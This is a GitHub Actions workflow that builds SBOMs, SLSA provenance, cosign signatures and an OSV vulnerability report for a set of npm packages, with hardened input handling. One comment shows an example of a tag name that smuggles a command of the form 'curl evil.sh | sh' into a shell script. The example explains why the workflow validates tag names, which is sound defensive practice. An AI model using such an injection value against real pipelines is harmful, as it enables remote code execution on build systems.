# Supply-chain attestation for Interlace npm packages.
#
# Roadmap item 6.D — produces, on every release, a verifiable supply-chain
# attestation bundle:
#
#   1. **SBOM** (CycloneDX 1.5 + SPDX 2.3) per package
#   2. **SLSA Provenance** v1.0 (build-attestation, signed by GitHub OIDC)
#   3. **sigstore signatures** for each tarball + SBOM (cosign keyless)
#   4. **OSV-Scanner** report — known vulnerabilities in declared deps
#
# The bundle uploads as workflow artifacts AND attaches to the corresponding
# GitHub Release. Consumers verify via `gh attestation verify` or the cosign /
# slsa-verifier CLIs — see CONTRIBUTING.md "Verifying supply chain" section.
#
# Triggers:
#   - On any release tag                       (production releases)
#   - Manual dispatch                          (testing)
#
# Tag patterns: changesets tags every package independently as
# `<package-name>@<semver>` (e.g. `eslint-plugin-secure-coding@3.7.1`) and never
# produces a bare `v*.*.*`. Matching only `v*.*.*` meant this workflow had never
# once fired on a real release — so despite building SBOMs, SLSA provenance and
# cosign signatures, no GitHub Release has ever actually carried one, and
# OpenSSF Scorecard's Signed-Releases check reports "no releases found".
# Both patterns are listed so a manual `v1.2.3` tag still works.

name: Supply-chain attestation

on:
  push:
    tags:
      - 'v*.*.*'
      - '*@*.*.*'
  workflow_dispatch:
    inputs:
      packages:
        description: 'Comma-separated package basenames (e.g. eslint-mcp-base,eslint-formatter-sarif) or "all".'
        default: 'all'

concurrency:
  # Tag-driven runs are inherently unique per tag; the cancel-in-progress
  # only matters for re-triggers via workflow_dispatch on the same ref.
  group: supply-chain-${{ github.ref }}
  cancel-in-progress: false

permissions:
  contents: read

jobs:
  attest:
    name: Attest each package
    runs-on: ubuntu-latest
    timeout-minutes: 30
    permissions:
      # `write`, not `read`: the final step uploads the bundle to the GitHub
      # Release via softprops/action-gh-release, which fails with
      # "403 Resource not accessible by integration" under contents: read.
      # With the tag trigger previously never matching a real release tag, that
      # step had never executed, so the wrong scope was never exercised.
      # Top-level `permissions:` stays read-only; only this job is elevated.
      contents: write
      id-token: write           # sigstore + SLSA OIDC token
      attestations: write       # actions/attest-build-provenance
      packages: write           # push attestations / image to GHCR
    steps:
      - name: Checkout
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1

      - name: Setup Node
        uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v6
        with:
          node-version-file: .nvmrc
          registry-url: 'https://registry.npmjs.org'
          cache: 'npm'

      - name: Install + build workspaces
        run: |
          npm ci
          npx turbo run build --filter='./packages/*'

      - name: Resolve target packages
        id: targets
        # `github.ref_name` and `inputs.packages` arrive through `env:`, never
        # by `${{ }}` interpolation into the script body. Git permits `"`, `;`
        # and `$` in a tag name, so a pushed tag like
        #   pkg@1.0.0"; curl evil.sh | sh; #
        # would otherwise be spliced into this shell verbatim.
        # Every resolved name is then re-validated against a strict charset so
        # nothing unexpected can reach the word-split loops downstream.
        env:
          REF_NAME: ${{ github.ref_name }}
          REQ: ${{ inputs.packages || 'all' }}
        run: |
          set -euo pipefail
          DEFAULT="eslint-mcp-base eslint-formatter-sarif \
                   secure-coding-mcp browser-security-mcp node-security-mcp crypto-mcp jwt-mcp \
                   express-security-mcp lambda-security-mcp mongodb-security-mcp nestjs-security-mcp \
                   vercel-ai-security-mcp pg-mcp"
          if [ "$REQ" != "all" ]; then
            LIST=$(printf '%s' "$REQ" | tr ',' ' ')
          elif printf '%s' "$REF_NAME" | grep -q '@'; then
            # changesets tag `<package-dir>@<semver>` — attest exactly the
            # package this release is for. Attaching the whole default fleet to
            # a single package's release would ship 13 unrelated tarballs.
            LIST="${REF_NAME%@*}"
          else
            LIST="$DEFAULT"
          fi

          # Reject anything that is not a plain npm directory name.
          for PKG in $LIST; do
            case "$PKG" in
              *[!A-Za-z0-9._-]*|'')
                echo "::error::Refusing unsafe package name: $PKG"
                exit 1
                ;;
            esac
          done

          echo "list=$LIST" >> "$GITHUB_OUTPUT"

      - name: Pack tarballs (one per package)
        env:
          TARGETS: ${{ steps.targets.outputs.list }}
        run: |
          mkdir -p artifacts/tarballs
          for PKG in $TARGETS; do
            DIR="packages/$PKG"
            [ -d "$DIR" ] || { echo "::warning::missing $DIR"; continue; }
            ( cd "$DIR" && npm pack --pack-destination "$GITHUB_WORKSPACE/artifacts/tarballs" )
          done
          ls -la artifacts/tarballs

      # ───────── SBOM (CycloneDX + SPDX) ─────────────────────────────────
      - name: Generate SBOM (CycloneDX) per package
        env:
          TARGETS: ${{ steps.targets.outputs.list }}
        # Hash-pinned via a committed lockfile in `.github/deps/cyclonedx/`,
        # mirroring what `.github/requirements/codecov-cli.txt` does for pip.
        # A version tag is not a pin: `@4.2.1` still resolved its transitive
        # tree at install time, which is what Scorecard's Pinned-Dependencies
        # check was flagging (alert #1326).
        #
        # Its own directory, not the workspace: `npm ci` here must not see or
        # rewrite the root lockfile, and the tool is CI-only — it has no
        # business in the published dependency graph.
        #
        # Bumped 4.2.1 -> 6.0.1 in the same change, because the lockfile is the
        # point. OSV reads committed lockfiles, so pinning 4.2.1 would have
        # published its one high-severity transitive advisory into the
        # Vulnerabilities check — trading a medium alert for a worse one.
        # Measured: 4.2.1 resolves 1 high, 6.0.1 resolves 0. The flags are
        # unchanged across the major, and lowercase `json` is still accepted;
        # verified by generating a valid CycloneDX 1.6 document with 6.0.1
        # before committing this.
        run: |
          npm ci --prefix .github/deps/cyclonedx
          CYCLONEDX=".github/deps/cyclonedx/node_modules/.bin/cyclonedx-npm"
          mkdir -p artifacts/sbom
          for PKG in $TARGETS; do
            DIR="packages/$PKG"
            [ -d "$DIR" ] || continue
            "$CYCLONEDX" --output-file "artifacts/sbom/$PKG.cyclonedx.json" --output-format json "$DIR" || \
              echo "::warning::CycloneDX failed for $PKG"
          done

      - name: Generate SBOM (SPDX) per package
        uses: anchore/sbom-action@e22c389904149dbc22b58101806040fa8d37a610 # v0
        with:
          path: ./packages
          format: spdx-json
          artifact-name: interlace-spdx-sbom.json
          upload-artifact: true

      # ───────── SLSA Provenance v1.0 ────────────────────────────────────
      # actions/attest-build-provenance attaches a signed SLSA L3 statement
      # to the tarballs. Verification: `gh attestation verify <tarball>`.
      - name: Attest build provenance (SLSA L3)
        uses: actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8 # v4
        with:
          subject-path: artifacts/tarballs/*.tgz

      # ───────── Sigstore signatures (cosign keyless) ────────────────────
      - name: Install cosign
        uses: sigstore/cosign-installer@6f9f17788090df1f26f669e9d70d6ae9567deba6 # v4.1.2

      - name: Sign tarballs + SBOMs with cosign (keyless)
        run: |
          for FILE in artifacts/tarballs/*.tgz artifacts/sbom/*.json; do
            [ -f "$FILE" ] || continue
            cosign sign-blob --yes --output-signature "$FILE.sig" --output-certificate "$FILE.pem" "$FILE"
          done

      # ───────── OSV vulnerability scan ──────────────────────────────────
      - name: Run OSV-Scanner against declared deps
        uses: google/osv-scanner-action/osv-scanner-action@6e4298ebc4db23e847df9b2e2de2939d6f066c67 # v2.5.1
        with:
          scan-args: |-
            --output=artifacts/osv-report.json
            --format=json
            --recursive
            packages/

      - name: Upload attestation bundle
        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7
        with:
          name: supply-chain-attestation-${{ github.sha }}
          path: |
            artifacts/tarballs/*.tgz
            artifacts/tarballs/*.sig
            artifacts/tarballs/*.pem
            artifacts/sbom/
            artifacts/osv-report.json

      - name: Attach attestation bundle to release (when tag-triggered)
        if: startsWith(github.ref, 'refs/tags/')
        uses: softprops/action-gh-release@3d0d9888cb7fd7b750713d6e236d1fcb99157228 # v3
        with:
          files: |
            artifacts/tarballs/*.tgz
            artifacts/tarballs/*.sig
            artifacts/tarballs/*.pem
            artifacts/sbom/*
            artifacts/osv-report.json

      - name: Summary
        if: always()
        env:
          EVENT_NAME: ${{ github.event_name }}
          REF_NAME: ${{ github.ref_name }}
          TARGETS: ${{ steps.targets.outputs.list }}
        run: |
          {
            echo "## Supply-chain attestation"
            echo ""
            echo "- Trigger: $EVENT_NAME"
            echo "- Tag: $REF_NAME"
            echo "- Packages: $(printf '%s' "$TARGETS" | wc -w)"
            echo ""
            echo "Verification (consumer):"
            echo '```bash'
            echo "gh attestation verify <tarball.tgz> --owner ofri-peretz"
            echo "cosign verify-blob --signature <tarball.tgz.sig> --certificate <tarball.tgz.pem> <tarball.tgz>"
            echo '```'
          } >> "$GITHUB_STEP_SUMMARY"
